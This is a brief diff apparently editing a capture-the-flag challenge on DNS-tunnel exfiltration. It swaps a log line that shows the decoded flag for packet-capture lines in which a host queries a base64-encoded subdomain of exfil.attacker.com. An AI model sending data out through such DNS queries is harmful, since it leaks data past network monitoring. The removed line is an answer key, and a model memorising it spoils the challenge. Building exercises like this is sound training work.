@@ -1,2 +1,2 @@
-DNS Query Log:
-Query: Q1RGe2Ruc183dW5uM2xfM3hmMWw3cjQ3MTBuXzIwMjZ9.exfil.attacker.com -> CTF{dns_7unn3l_3xf1l7r4710n_2026}
+12:00:01.102 IP 192.168.1.50.53123 > 8.8.8.8.53: 1024+ A? Q1RGe2Ruc183dW5uM2xfM3hmMWw3cjQ3MTBuXzIwMjZ9.exfil.attacker.com. (58)
+12:00:01.105 IP 8.8.8.8.53 > 192.168.1.50.53123: 1024 1/0/0 A 127.0.0.1 (74)
